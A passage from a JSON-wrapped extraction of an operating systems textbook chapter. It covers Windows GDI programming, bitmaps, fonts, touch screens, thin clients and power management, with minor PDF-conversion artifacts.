n(DefWindowProc(hwnd, message, wParam, lParam)); /* default */\r\n}\r\nFigure 5-36. A skeleton of a Windows main program.\r\niCmdShow, tells whether the program’s initial window should occupy the entire\r\nscreen, part of the screen, or none of the screen (task bar only).\r\nThis declaration illustrates a widely used Microsoft convention called Hungar\u0002ian notation. The name is a play on Polish notation, the postfix system invented\r\nby the Polish logician J. Lukasiewicz for representing algebraic formulas without\r\nusing precedence or parentheses. Hungarian notation was invented by a Hungarian\r\nprogrammer at Microsoft, Charles Simonyi, and uses the first few characters of an\r\nidentifier to specify the type. The allowed letters and types include c (character), w\r\n(word, now meaning an unsigned 16-bit integer), i (32-bit signed integer), l (long,\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 409\r\nalso a 32-bit signed integer), s (string), sz (string terminated by a zero byte), p\r\n(pointer), fn (function), and h (handle). Thus szCmd is a zero-terminated string\r\nand iCmdShow is an integer, for example. Many programmers believe that en\u0002coding the type in variable names this way has little value and makes Windows\r\ncode hard to read. Nothing analogous to this convention is present in UNIX.\r\nEvery window must have an associated class object that defines its properties.\r\nIn Fig. 5-36, that class object is wndclass. An object of type WNDCLASS has 10\r\nfields, four of which are initialized in Fig. 5-36. In an actual program, the other six\r\nwould be initialized as well. The most important field is lpfnWndProc, which is a\r\nlong (i.e., 32-bit) pointer to the function that handles the messages directed to this\r\nwindow. The other fields initialized here tell which name and icon to use in the\r\ntitle bar, and which symbol to use for the mouse cursor.\r\nAfter wndclass has been initialized, RegisterClass is called to pass it to Win\u0002dows. In particular, after this call Windows knows which procedure to call when\r\nvarious events occur that do not go through the message queue. The next call, Cre\u0002ateWindow, allocates memory for the window’s data structure and returns a handle\r\nfor referencing it later. The program then makes two more calls in a row, to put the\r\nwindow’s outline on the screen, and finally fill it in completely.\r\nAt this point we come to the program’s main loop, which consists of getting a\r\nmessage, having certain translations done to it, and then passing it back to Win\u0002dows to have Windows invoke WndProc to process it. To answer the question of\r\nwhether this whole mechanism could have been made simpler, the answer is yes,\r\nbut it was done this way for historical reasons and we are now stuck with it.\r\nFollowing the main program is the procedure WndProc, which handles the\r\nvarious messages that can be sent to the window. The use of CALLBACK here, like\r\nWINAPI above, specifies the calling sequence to use for parameters. The first pa\u0002rameter is the handle of the window to use. The second parameter is the message\r\ntype. The third and fourth parameters can be used to provide additional infor\u0002mation when needed.\r\nMessage types WM CREATE and WM DESTROY are sent at the start and end\r\nof the program, respectively. They giv e the program the opportunity, for example,\r\nto allocate memory for data structures and then return it.\r\nThe third message type, WM PAINT, is an instruction to the program to fill in\r\nthe window. It is called not only when the window is first drawn, but often during\r\nprogram execution as well. In contrast to text-based systems, in Windows a pro\u0002gram cannot assume that whatever it draws on the screen will stay there until it re\u0002moves it. Other windows can be dragged on top of this one, menus can be pulled\r\ndown over it, dialog boxes and tool tips can cover part of it, and so on. When these\r\nitems are removed, the window has to be redrawn. The way Windows tells a pro\u0002gram to redraw a window is to send it a WM PAINT message. As a friendly ges\u0002ture, it also provides information about what part of the window has been overwrit\u0002ten, in case it is easier or faster to regenerate that part of the window instead of\r\nredrawing the whole thing from scratch.\n410 INPUT/OUTPUT CHAP. 5\r\nThere are two ways Windows can get a program to do something. One way is\r\nto post a message to its message queue. This method is used for keyboard input,\r\nmouse input, and timers that have expired. The other way, sending a message to the\r\nwindow, inv olves having Windows directly call WndProc itself. This method is\r\nused for all other events. Since Windows is notified when a message is fully proc\u0002essed, it can refrain from making a new call until the previous one is finished. In\r\nthis way race conditions are avoided.\r\nThere are many more message types. To avoid erratic behavior should an un\u0002expected message arrive, the program should call DefWindowProc at the end of\r\nWndProc to let the default handler take care of the other cases.\r\nIn summary, a Windows program normally creates one or more windows with\r\na class object for each one. Associated with each program is a message queue and\r\na set of handler procedures. Ultimately, the program’s behavior is driven by the in\u0002coming events, which are processed by the handler procedures. This is a very dif\u0002ferent model of the world than the more procedural view that UNIX takes.\r\nDrawing to the screen is handled by a package consisting of hundreds of pro\u0002cedures that are bundled together to form the GDI (Graphics Device Interface).\r\nIt can handle text and graphics and is designed to be platform and device indepen\u0002dent. Before a program can draw (i.e., paint) in a window, it needs to acquire a de\u0002vice context, which is an internal data structure containing properties of the win\u0002dow, such as the font, text color, background color, and so on. Most GDI calls use\r\nthe device context, either for drawing or for getting or setting the properties.\r\nVarious ways exist to acquire the device context. A simple example of its\r\nacquisition and use is\r\nhdc = GetDC(hwnd);\r\nTe xtOut(hdc, x, y, psText, iLength);\r\nReleaseDC(hwnd, hdc);\r\nThe first statement gets a handle to a device content, hdc. The second one uses the\r\ndevice context to write a line of text on the screen, specifying the (x, y) coordinates\r\nof where the string starts, a pointer to the string itself, and its length. The third call\r\nreleases the device context to indicate that the program is through drawing for the\r\nmoment. Note that hdc is used in a way analogous to a UNIX file descriptor. Also\r\nnote that ReleaseDC contains redundant information (the use of hdc uniquely\r\nspecifies a window). The use of redundant information that has no actual value is\r\ncommon in Windows.\r\nAnother interesting note is that when hdc is acquired in this way, the program\r\ncan write only in the client area of the window, not in the title bar and other parts\r\nof it. Internally, in the device context’s data structure, a clipping region is main\u0002tained. Any drawing outside the clipping region is ignored. However, there is an\u0002other way to acquire a device context, GetWindowDC, which sets the clipping re\u0002gion to the entire window. Other calls restrict the clipping region in other ways.\r\nHaving multiple calls that do almost the same thing is characteristic of Windows.\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 411\r\nA complete treatment of the GDI is out of the question here. For the interested\r\nreader, the references cited above provide additional information. Nevertheless,\r\ngiven how important it is, a few words about the GDI are probably worthwhile.\r\nGDI has various procedure calls to get and release device contexts, obtain infor\u0002mation about device contexts, get and set device context attributes (e.g., the back\u0002ground color), manipulate GDI objects such as pens, brushes, and fonts, each of\r\nwhich has its own attributes. Finally, of course, there are a large number of GDI\r\ncalls to actually draw on the screen.\r\nThe drawing procedures fall into four categories: drawing lines and curves,\r\ndrawing filled areas, managing bitmaps, and displaying text. We saw an example\r\nof drawing text above, so let us take a quick look at one of the others. The call\r\nRectangle(hdc, xleft, ytop, xright, ybottom);\r\ndraws a filled rectangle whose corners are (xleft, ytop) and (xright, ybottom). For\r\nexample,\r\nRectangle(hdc, 2, 1, 6, 4);\r\nwill draw the rectangle shown in Fig. 5-37. The line width and color and fill color\r\nare taken from the device context. Other GDI calls are similar in flavor.\r\n0\r\n0\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7\r\n12 345678\r\nFigure 5-37. An example rectangle drawn using Rectangle. Each box represents\r\none pixel.\r\nBitmaps\r\nThe GDI procedures are examples of vector graphics. They are used to place\r\ngeometric figures and text on the screen. They can be scaled easily to larger or\r\nsmaller screens (provided the number of pixels on the screen is the same). They\r\nare also relatively device independent. A collection of calls to GDI procedures can\r\nbe assembled in a file that can describe a complex drawing. Such a file is called a\n412 INPUT/OUTPUT CHAP. 5\r\nWindows metafile and is widely used to transmit drawings from one Windows pro\u0002gram to another. Such files have extension .wmf.\r\nMany Windows programs allow the user to copy (part of) a drawing and put it\r\non the Windows clipboard. The user can then go to another program and paste the\r\ncontents of the clipboard into another document. One way of doing this is for the\r\nfirst program to represent the drawing as a Windows metafile and put it on the clip\u0002board in .wmf format. Other ways also exist.\r\nNot all the images that computers manipulate can be generated using vector\r\ngraphics. Photographs and videos, for example, do not use vector graphics. In\u0002stead, these items are scanned in by overlaying a grid on the image. The average\r\nred, green, and blue values of each grid square are then sampled and saved as the\r\nvalue of one pixel. Such a file is called a bitmap. There are extensive facilities in\r\nWindows for manipulating bitmaps.\r\nAnother use for bitmaps is for text. One way to represent a particular character\r\nin some font is as a small bitmap. Adding text to the screen then becomes a matter\r\nof moving bitmaps.\r\nOne general way to use bitmaps is through a procedure called BitBlt. It is cal\u0002led as follows:\r\nBitBlt(dsthdc, dx, dy, wid, ht, srchdc, sx, sy, rasterop);\r\nIn its simplest form, it copies a bitmap from a rectangle in one window to a rectan\u0002gle in another window (or the same one). The first three parameters specify the\r\ndestination window and position. Then come the width and height. Next come the\r\nsource window and position. Note that each window has its own coordinate sys\u0002tem, with (0, 0) in the upper left-hand corner of the window. The last parameter\r\nwill be described below. The effect of\r\nBitBlt(hdc2, 1, 2, 5, 7, hdc1, 2, 2, SRCCOPY);\r\nis shown in Fig. 5-38. Notice carefully that the entire 5 × 7 area of the letter A has\r\nbeen copied, including the background color.\r\nBitBlt can do more than just copy bitmaps. The last parameter gives the possi\u0002bility of performing Boolean operations to combine the source bitmap and the\r\ndestination bitmap. For example, the source can be ORed into the destination to\r\nmerge with it. It can also be EXCLUSIVE ORed into it, which maintains the char\u0002acteristics of both source and destination.\r\nA problem with bitmaps is that they do not scale. A character that is in a box\r\nof 8 × 12 on a display of 640 × 480 will look reasonable. However, if this bitmap is\r\ncopied to a printed page at 1200 dots/inch, which is 10,200 bits × 13,200 bits, the\r\ncharacter width (8 pixels) will be 8/1200 inch or 0.17 mm. In addition, copying\r\nbetween devices with different color properties or between monochrome and color\r\ndoes not work well.\r\nFor this reason, Windows also supports a data structure called a DIB (Device\r\nIndependent Bitmap). Files using this format use the extension .bmp. These files\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 413\r\n02468\r\n0\r\n2\r\n4\r\n6\r\n8\r\n02468\r\n0\r\n2\r\n4\r\n6\r\n8\r\nWindow 1\r\nWindow 2\r\n02468\r\n0\r\n2\r\n4\r\n6\r\n8\r\n02468\r\n0\r\n2\r\n4\r\n6\r\n8\r\nWindow 1\r\nWindow 2\r\n(a) (b)\r\nFigure 5-38. Copying bitmaps using BitBlt. (a) Before. (b) After.\r\nhave file and information headers and a color table before the pixels. This infor\u0002mation makes it easier to move bitmaps between dissimilar devices.\r\nFonts\r\nIn versions of Windows before 3.1, characters were represented as bitmaps and\r\ncopied onto the screen or printer using BitBlt. The problem with that, as we just\r\nsaw, is that a bitmap that makes sense on the screen is too small for the printer.\r\nAlso, a different bitmap is needed for each character in each size. In other words,\r\ngiven the bitmap for A in 10-point type, there is no way to compute it for 12-point\r\ntype. Because every character of every font might be needed for sizes ranging from\r\n4 point to 120 point, a vast number of bitmaps were needed. The whole system was\r\njust too cumbersome for text.\r\nThe solution was the introduction of TrueType fonts, which are not bitmaps but\r\noutlines of the characters. Each TrueType character is defined by a sequence of\r\npoints around its perimeter. All the points are relative to the (0, 0) origin. Using\r\nthis system, it is easy to scale the characters up or down. All that has to be done is\r\nto multiply each coordinate by the same scale factor. In this way, a TrueType char\u0002acter can be scaled up or down to any point size, even fractional point sizes. Once\r\nat the proper size, the points can be connected using the well-known follow-the\u0002dots algorithm taught in kindergarten (note that modern kindergartens use splines\r\nfor smoother results). After the outline has been completed, the character can be\r\nfilled in. An example of some characters scaled to three different point sizes is\r\ngiven in Fig. 5-39.\r\nOnce the filled character is available in mathematical form, it can be rasterized,\r\nthat is, converted to a bitmap at whatever resolution is desired. By first scaling and\r\nthen rasterizing, we can be sure that the characters displayed on the screen or\r\nprinted on the printer will be as close as possible, differing only in quantization\n414 INPUT/OUTPUT CHAP. 5\r\n20 pt: \r\n53 pt: \r\n81 pt: \r\nFigure 5-39. Some examples of character outlines at different point sizes.\r\nerror. To improve the quality still more, it is possible to embed hints in each char\u0002acter telling how to do the rasterization. For example, both serifs on the top of the\r\nletter T should be identical, something that might not otherwise be the case due to\r\nroundoff error. Hints improve the final appearance.\r\nTouch Screens\r\nMore and more the screen is used as an input device also. Especially on smart\u0002phones, tablets and other ultra-portable devices it is convenient to tap and swipe\r\naw ay at the screen with your finger (or a stylus). The user experience is different\r\nand more intuitive than with a mouse-like device, since the user interacts directly\r\nwith the objects on the screen. Research has shown that even orangutans and other\r\nprimates like little children are capable of operating touch-based devices.\r\nA touch device is not necessarily a screen. Touch devices fall into two cate\u0002gories: opaque and transparent. A typical opaque touch device is the touchpad on a\r\nnotebook computer. An example of a transparent device is the touch screen on a\r\nsmartphone or tablet. In this section, however, we limit ourselves to touch screens.\r\nLike many things that have come into fashion in the computer industry, touch\r\nscreens are not exactly new. As early as 1965, E.A. Johnson of the British Royal\r\nRadar Establishment described a (capacitive) touch display that, while crude,\r\nserved as precursor of the displays we find today. Most modern touch screens are\r\neither resistive or capacitive.\r\nResistive screens have a flexible plastic surface on top. The plastic in itself is\r\nnothing too special, except that is more scratch resistant than your garden variety\nSEC. 5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 415\r\nplastic. However, a thin film of ITO (Indium Tin Oxide) or some similar con\u0002ducive material) is printed in thin lines onto the surface’s underside. Beneath it, but\r\nnot quite touching it, is a second surface also coated with a layer of ITO. On the\r\ntop surface, the charge runs in the vertical direction and there are conductive con\u0002nections at the top and bottom. In the bottom layer the charge runs horizontally and\r\nthere are connections on the left and right. When you touch the screen, you dent\r\nthe plastic so that the top layer of ITO touches the bottom layer. To find out the\r\nexact position of the finger or stylus touching it, all you need to do is measure the\r\nresistance in both directions at all the horizontal positions of the bottom and all the\r\nvertical positions of the top layer.\r\nCapacitive Screens have two hard surfaces, typically glass, each coated with\r\nITO. A typical configuration is to have ITO added to each surface in parallel lines,\r\nwhere the lines in the top layer are perpendicular to those in the bottom layer. For\r\ninstance, the top layer may be coated in thin lines in a vertical direction, while the\r\nbottom layer has a similarly striped pattern in the horizontal direction. The two\r\ncharged surfaces, separated by air, form a grid of really small capacitors. Voltages\r\nare applied alternately to the horizontal and vertical lines, while the voltage values,\r\nwhich are affected by the capacitance of each intersection, are read out on the other\r\nones. When you put your finger onto the screen, you change the local capacitance.\r\nBy very accurately measuring the miniscule voltage changes everywhere, it is pos\u0002sible to discover the location of the finger on the screen. This operation is repeated\r\nmany times per second with the coordinates touched fed to the device driver as a\r\nstream of (x, y) pairs. Further processing, such as determining whether pointing,\r\npinching, expanding, or swiping is taking place is done by the operating system.\r\nWhat is nice about resistive screens is that the pressure determines the outcome\r\nof the measurements. In other words, it will work even if you are wearing gloves in\r\ncold weather. This is not true of capacitive screens, unless you wear special gloves.\r\nFor instance, you can sew a conductive thread (like silver-plated nylon) through the\r\nfingertips of the gloves, or if you are not a needling person, buy them ready-made.\r\nAlternatively, you cut off the tips of your gloves and be done in 10 seconds.\r\nWhat is not so nice about resistive screens is that they typically cannot support\r\nmultitouch, a technique that detects multiple touches at the same time. It allows\r\nyou to manipulate objects on the screen with two or more fingers. People (and per\u0002haps also orangutans) like multitouch because it enables them to use pinch-and-ex\u0002pand gestures with two fingers to enlarge or shrink a picture or document. Imagine\r\nthat the two fingers are at (3, 3) and (8, 8). As a result, the resistive screen may\r\nnotice a change in resistance on the x = 3 and x = 8 vertical lines, and the y = 3 and\r\ny = 8 horizontal lines. Now consider a different scenario with the fingers at (3, 8)\r\nand (8, 3), which are the opposite corners of the rectangle whose corners are (3, 3),\r\n(8, 3), (8, 8), and (3, 8). The resistance in precisely the same lines has changed, so\r\nthe software has no way of telling which of the two scenarios holds. This problem\r\nis called ghosting. Because capacitive screens send a stream of (x, y) coordinates,\r\nthey are more adept at supporting multitouch.\n416 INPUT/OUTPUT CHAP. 5\r\nManipulating a touch screen with just a single finger is still fairly WIMPy—\r\nyou just replace the mouse pointer with your stylus or index finger. Multitouch is a\r\nbit more complicated. Touching the screen with fiv e fingers is like pushing fiv e\r\nmouse pointers across the screen at the same time and clearly changes things for\r\nthe window manager. Multitouch screens have become ubiquitous and increasingly\r\nsensitive and accurate. Nevertheless, it is unclear whether the Five Point Palm\r\nExploding Heart Technique has any effect on the CPU."
          }
        }
      },
      "5.7 THIN CLIENTS": {
        "page": 447,
        "content": "5.7 THIN CLIENTS\r\nOver the years, the main computing paradigm has oscillated between cent\u0002ralized and decentralized computing. The first computers, such as the ENIAC,\r\nwere, in fact, personal computers, albeit large ones, because only one person could\r\nuse one at once. Then came timesharing systems, in which many remote users at\r\nsimple terminals shared a big central computer. Next came the PC era, in which the\r\nusers had their own personal computers again.\r\nWhile the decentralized PC model has advantages, it also has some severe\r\ndisadvantages that are only beginning to be taken seriously. Probably the biggest\r\nproblem is that each PC has a large hard disk and complex software that must be\r\nmaintained. For example, when a new release of the operating system comes out, a\r\ngreat deal of work has to be done to perform the upgrade on each machine sepa\u0002rately. At most corporations, the labor costs of doing this kind of software mainte\u0002nance dwarf the actual hardware and software costs. For home users, the labor is\r\ntechnically free, but few people are capable of doing it correctly and fewer still\r\nenjoy doing it. With a centralized system, only one or a few machines have to be\r\nupdated and those machines have a staff of experts to do the work.\r\nA related issue is that users should make regular backups of their gigabyte file\r\nsystems, but few of them do. When disaster strikes, a great deal of moaning and\r\nwringing of hands tends to follow. With a centralized system, backups can be made\r\nev ery night by automated tape robots.\r\nAnother advantage is that resource sharing is easier with centralized systems.\r\nA system with 256 remote users, each with 256 MB of RAM, will have most of\r\nthat RAM idle most of the time. With a centralized system with 64 GB of RAM, it\r\nnever happens that some user temporarily needs a lot of RAM but cannot get it be\u0002cause it is on someone else’s PC. The same argument holds for disk space and\r\nother resources.\r\nFinally, we are starting to see a shift from PC-centric computing to Web-cen\u0002tric computing. One area where this shift is very far along is email. People used to\r\nget their email delivered to their home machine and read it there. Nowadays, many\r\npeople log into Gmail, Hotmail, or Yahoo and read their mail there. The next step\r\nis for people to log into other Websites to do word processing, build spreadsheets,\nSEC. 5.7 THIN CLIENTS 417\r\nand other things that used to require PC software. It is even possible that eventually\r\nthe only software people run on their PC is a Web browser, and maybe not even\r\nthat.\r\nIt is probably a fair conclusion to say that most users want high-performance\r\ninteractive computing but do not really want to administer a computer. This has led\r\nresearchers to reexamine timesharing using dumb terminals (now politely called\r\nthin clients) that meet modern terminal expectations. X was a step in this direc\u0002tion and dedicated X terminals were popular for a little while but they fell out of\r\nfavor because they cost as much as PCs, could do less, and still needed some soft\u0002ware maintenance. The holy grail would be a high-performance interactive com\u0002puting system in which the user machines had no software at all. Interestingly\r\nenough, this goal is achievable.\r\nOne of the best known thin clients is the Chromebook. It is pushed actively\r\nby Google, but with a wide variety of manufacturers providing a wide variety of\r\nmodels. The notebook runs ChromeOS which is based on Linux and the Chrome\r\nWeb browser and is assumed to be online all the time. Most other software is\r\nhosted on the Web in the form of Web Apps, making the software stack on the\r\nChromebook itself considerably thinner than in most traditional notebooks. On the\r\nother hand, a system that runs a full Linux stack, and a Chrome browser, it is not\r\nexactly anorexic either."
      },
      "5.8 POWER MANAGEMENT": {
        "page": 448,
        "children": {
          "5.8.1 Hardware Issues": {
            "page": 449,
            "content": "5.8.1 Hardware Issues\r\nBatteries come in two general types: disposable and rechargeable. Disposable\r\nbatteries (most commonly AAA, AA, and D cells) can be used to run handheld de\u0002vices, but do not have enough energy to power notebook computers with large\r\nbright screens. A rechargeable battery, in contrast, can store enough energy to\r\npower a notebook for a few hours. Nickel cadmium batteries used to dominate\r\nhere, but they gav e way to nickel metal hydride batteries, which last longer and do\r\nnot pollute the environment quite as badly when they are eventually discarded.\r\nLithium ion batteries are even better, and may be recharged without first being\r\nfully drained, but their capacities are also severely limited.\r\nThe general approach most computer vendors take to battery conservation is to\r\ndesign the CPU, memory, and I/O devices to have multiple states: on, sleeping,\r\nhibernating, and off. To use the device, it must be on. When the device will not be\r\nneeded for a short time, it can be put to sleep, which reduces energy consumption.\r\nWhen it is not expected to be needed for a longer interval, it can be made to hiber\u0002nate, which reduces energy consumption even more. The trade-off here is that get\u0002ting a device out of hibernation often takes more time and energy than getting it\r\nout of sleep state. Finally, when a device is off, it does nothing and consumes no\r\npower. Not all devices have all these states, but when they do, it is up to the oper\u0002ating system to manage the state transitions at the right moments.\r\nSome computers have two or even three power buttons. One of these may put\r\nthe whole computer in sleep state, from which it can be awakened quickly by typ\u0002ing a character or moving the mouse. Another may put the computer into hiberna\u0002tion, from which wakeup takes far longer. In both cases, these buttons typically do\nSEC. 5.8 POWER MANAGEMENT 419\r\nnothing except send a signal to the operating system, which does the rest in soft\u0002ware. In some countries, electrical devices must, by law, hav e a mechanical power\r\nswitch that breaks a circuit and removes power from the device, for safety reasons.\r\nTo comply with this law, another switch may be needed.\r\nPower management brings up a number of questions that the operating system\r\nhas to deal with. Many of them relate to resource hibernation—selectively and\r\ntemporarily turning off devices, or at least reducing their power consumption when\r\nthey are idle. Questions that must be answered include these: Which devices can be\r\ncontrolled? Are they on/off, or are there intermediate states? How much power is\r\nsaved in the low-power states? Is energy expended to restart the device? Must\r\nsome context be saved when going to a low-power state? How long does it take to\r\ngo back to full power? Of course, the answers to these questions vary from device\r\nto device, so the operating system must be able to deal with a range of possibilities.\r\nVarious researchers have examined notebook computers to see where the pow\u0002er goes. Li et al. (1994) measured various workloads and came to the conclusions\r\nshown in Fig. 5-40. Lorch and Smith (1998) made measurements on other ma\u0002chines and came to the conclusions shown in Fig. 5-40. Weiser et al. (1994) also\r\nmade measurements but did not publish the numerical values. They simply stated\r\nthat the top three energy sinks were the display, hard disk, and CPU, in that order.\r\nWhile these numbers do not agree closely, possibly because the different brands of\r\ncomputers measured indeed have different energy requirements, it seems clear that\r\nthe display, hard disk, and CPU are obvious targets for saving energy. On devices\r\nlike smartphones, there may be other power drains, like the radio and GPS. Al\u0002though we focus on displays, disks, CPUs and memory in this section, the princ\u0002ples are the same for other peripherals.\r\nDevice Li et al. (1994) Lorch and Smith (1998)\r\nDisplay 68% 39%\r\nCPU 12% 18%\r\nHard disk 20% 12%\r\nModem 6%\r\nSound 2%\r\nMemor y 0.5% 1%\r\nOther 22%\r\nFigure 5-40. Power consumption of various parts of a notebook computer."
          },
          "5.8.2 Operating System Issues": {
            "page": 450,
            "content": "5.8.2 Operating System Issues\r\nThe operating system plays a key role in energy management. It controls all\r\nthe devices, so it must decide what to shut down and when to shut it down. If it\r\nshuts down a device and that device is needed again quickly, there may be an\n420 INPUT/OUTPUT CHAP. 5\r\nannoying delay while it is restarted. On the other hand, if it waits too long to shut\r\ndown a device, energy is wasted for nothing.\r\nThe trick is to find algorithms and heuristics that let the operating system make\r\ngood decisions about what to shut down and when. The trouble is that ‘‘good’’ is\r\nhighly subjective. One user may find it acceptable that after 30 seconds of not\r\nusing the computer it takes 2 seconds for it to respond to a keystroke. Another user\r\nmay swear a blue streak under the same conditions. In the absence of audio input,\r\nthe computer cannot tell these users apart.\r\nThe Display\r\nLet us now look at the big spenders of the energy budget to see what can be\r\ndone about each one. One of the biggest items in everyone’s energy budget is the\r\ndisplay. To get a bright sharp image, the screen must be backlit and that takes sub\u0002stantial energy. Many operating systems attempt to save energy here by shutting\r\ndown the display when there has been no activity for some number of minutes.\r\nOften the user can decide what the shutdown interval is, thus pushing the trade-off\r\nbetween frequent blanking of the screen and draining the battery quickly back to\r\nthe user (who probably really does not want it). Turning off the display is a sleep\r\nstate because it can be regenerated (from the video RAM) almost instantaneously\r\nwhen any key is struck or the pointing device is moved.\r\nOne possible improvement was proposed by Flinn and Satyanarayanan (2004).\r\nThey suggested having the display consist of some number of zones that can be in\u0002dependently powered up or down. In Fig. 5-41, we depict 16 zones, using dashed\r\nlines to separate them. When the cursor is in window 2, as shown in Fig. 5-41(a),\r\nonly the four zones in the lower righthand corner have to be lit up. The other 12\r\ncan be dark, saving 3/4 of the screen power.\r\nWhen the user moves the cursor to window 1, the zones for window 2 can be\r\ndarkened and the zones behind window 1 can be turned on. However, because win\u0002dow 1 straddles 9 zones, more power is needed. If the window manager can sense\r\nwhat is happening, it can automatically move window 1 to fit into four zones, with\r\na kind of snap-to-zone action, as shown in Fig. 5-41(b). To achieve this reduction\r\nfrom 9/16 of full power to 4/16 of full power, the window manager has to under\u0002stand power management or be capable of accepting instructions from some other\r\npiece of the system that does. Even more sophisticated would be the ability to par\u0002tially illuminate a window that was not completely full (e.g., a window containing\r\nshort lines of text could be kept dark on the right-hand side).\r\nThe Hard Disk\r\nAnother major villain is the hard disk. It takes substantial energy to keep it\r\nspinning at high speed, even if there are no accesses. Many computers, especially\r\nnotebooks, spin the disk down after a certain number of minutes of being idle.\nSEC. 5.8 POWER MANAGEMENT 421\r\nWindow 1\r\nWindow 2\r\nWindow 1\r\nWindow 2\r\nZone\r\n(a) (b)\r\nFigure 5-41. The use of zones for backlighting the display. (a) When window 2\r\nis selected, it is not moved. (b) When window 1 is selected, it moves to reduce\r\nthe number of zones illuminated.\r\nWhen it is next needed, it is spun up again. Unfortunately, a stopped disk is hiber\u0002nating rather than sleeping because it takes quite a few seconds to spin it up again,\r\nwhich causes noticeable delays for the user.\r\nIn addition, restarting the disk consumes considerable energy. As a conse\u0002quence, every disk has a characteristic time, Td , that is its break-even point, often\r\nin the range 5 to 15 sec. Suppose that the next disk access is expected to come\r\nsome time t in the future. If t < Td , it takes less energy to keep the disk spinning\r\nrather than spin it down and then spin it up so quickly. If t > Td , the energy saved\r\nmakes it worth spinning the disk down and then up again much later. If a good\r\nprediction could be made (e.g., based on past access patterns), the operating sys\u0002tem could make good shutdown predictions and save energy. In practice, most sys\u0002tems are conservative and stop the disk only after a few minutes of inactivity.\r\nAnother way to save disk energy is to have a substantial disk cache in RAM.\r\nIf a needed block is in the cache, an idle disk does not have to be restarted to sat\u0002isfy the read. Similarly, if a write to the disk can be buffered in the cache, a stop\u0002ped disk does not have to restarted just to handle the write. The disk can remain off\r\nuntil the cache fills up or a read miss happens.\r\nAnother way to avoid unnecessary disk starts is for the operating system to\r\nkeep running programs informed about the disk state by sending them messages or\r\nsignals. Some programs have discretionary writes that can be skipped or delayed.\r\nFor example, a word processor may be set up to write the file being edited to disk\r\nev ery few minutes. If at the moment it would normally write the file out, the word\r\nprocessor knows that the disk is off, it can delay this write until it is turned on.\r\nThe CPU\r\nThe CPU can also be managed to save energy. A notebook CPU can be put to\r\nsleep in software, reducing power usage to almost zero. The only thing it can do in\r\nthis state is wake up when an interrupt occurs. Therefore, whenever the CPU goes\r\nidle, either waiting for I/O or because there is no work to do, it goes to sleep.\n422 INPUT/OUTPUT CHAP. 5\r\nOn many computers, there is a relationship between CPU voltage, clock cycle,\r\nand power usage. The CPU voltage can often be reduced in software, which saves\r\nenergy but also reduces the clock cycle (approximately linearly). Since power con\u0002sumed is proportional to the square of the voltage, cutting the voltage in half makes\r\nthe CPU about half as fast but at 1/4 the power.\r\nThis property can be exploited for programs with well-defined deadlines, such\r\nas multimedia viewers that have to decompress and display a frame every 40 msec,\r\nbut go idle if they do it faster. Suppose that a CPU uses x joules while running full\r\nblast for 40 msec and x/4 joules running at half speed. If a multimedia viewer can\r\ndecompress and display a frame in 20 msec, the operating system can run at full\r\npower for 20 msec and then shut down for 20 msec for a total energy usage of x/2\r\njoules. Alternatively, it can run at half power and just make the deadline, but use\r\nonly x/4 joules instead. A comparison of running at full speed and full power for\r\nsome time interval and at half speed and one-quarter power for twice as long is\r\nshown in Fig. 5-42. In both cases the same work is done, but in Fig. 5-42(b) only\r\nhalf the energy is consumed doing it.\r\n1.00\r\n0.75\r\n0.50\r\n0.25\r\n0\r\n0 T/2 T\r\nTime\r\nPower\r\n(a)\r\n1.00\r\n0.75\r\n0.50\r\n0.25\r\n0\r\n0 T/2 T\r\nTime\r\nPower\r\n(b)\r\nFigure 5-42. (a) Running at full clock speed. (b) Cutting voltage by two cuts\r\nclock speed by two and power consumption by four.\r\nIn a similar vein, if a user is typing at 1 char/sec, but the work needed to proc\u0002ess the character takes 100 msec, it is better for the operating system to detect the\r\nlong idle periods and slow the CPU down by a factor of 10. In short, running\r\nslowly is more energy efficient than running quickly.\r\nInterestingly, scaling down the CPU cores does not always imply a reduction\r\nin performance. Hruby et al. (2013) show that sometimes the performance of the\r\nnetwork stack improves with slower cores. The explanation is that a core can be too\r\nfast for its own good. For instance, imagine a CPU with several fast cores, where\r\none core is responsible for the transmission of network packets on behalf of a pro\u0002ducer running on another core. The producer and the network stack communicate\r\ndirectly via shared memory and they both run on dedicated cores. The producer\r\nperforms a fair amount of computation and cannot quite keep up with the core of\r\nthe network stack. On a typical run, the network will transmit all it has to transmit\r\nand poll the shared memory for some amount of time to see if there is really no\nSEC. 5.8 POWER MANAGEMENT 423\r\nmore data to transmit. Finally, it will give up and go to sleep, because continuous\r\npolling is very bad for power consumption. Shortly after, the producer provides\r\nmore data, but now the network stack is fast sleep. Waking up the stack takes time\r\nand slows down the throughput. One possible solution is never to sleep, but this is\r\nnot attractive either because doing so would increase the power consumption—ex\u0002actly the opposite of what we are trying to achieve. A much more attractive solu\u0002tion is to run the network stack on a slower core, so that it is constantly busy (and\r\nthus never sleeps), while still reducing the power consumption. If the network core\r\nis slowed down carefully, its performance will be better than a configuration where\r\nall cores are blazingly fast.\r\nThe Memory\r\nTw o possible options exist for saving energy with the memory. First, the cache\r\ncan be flushed and then switched off. It can always be reloaded from main memo\u0002ry with no loss of information. The reload can be done dynamically and quickly, so\r\nturning off the cache is entering a sleep state.\r\nA more drastic option is to write the contents of main memory to the disk, then\r\nswitch off the main memory itself. This approach is hibernation, since virtually all\r\npower can be cut to memory at the expense of a substantial reload time, especially\r\nif the disk is off, too. When the memory is cut off, the CPU either has to be shut off\r\nas well or has to execute out of ROM. If the CPU is off, the interrupt that wakes it\r\nup has to cause it to jump to code in ROM so the memory can be reloaded before\r\nbeing used. Despite all the overhead, switching off the memory for long periods of\r\ntime (e.g., hours) may be worth it if restarting in a few seconds is considered much\r\nmore desirable than rebooting the operating system from disk, which often takes a\r\nminute or more.\r\nWireless Communication\r\nIncreasingly many portable computers have a wireless connection to the out\u0002side world (e.g., the Internet). The radio transmitter and receiver required are often\r\nfirst-class power hogs. In particular, if the radio receiver is always on in order to\r\nlisten for incoming email, the battery may drain fairly quickly. On the other hand,\r\nif the radio is switched off after, say, 1 minute of being idle, incoming messages\r\nmay be missed, which is clearly undesirable.\r\nOne efficient solution to this problem has been proposed by Kravets and Krish\u0002nan (1998). The heart of their solution exploits the fact that mobile computers\r\ncommunicate with fixed base stations that have large memories and disks and no\r\npower constraints. What they propose is to have the 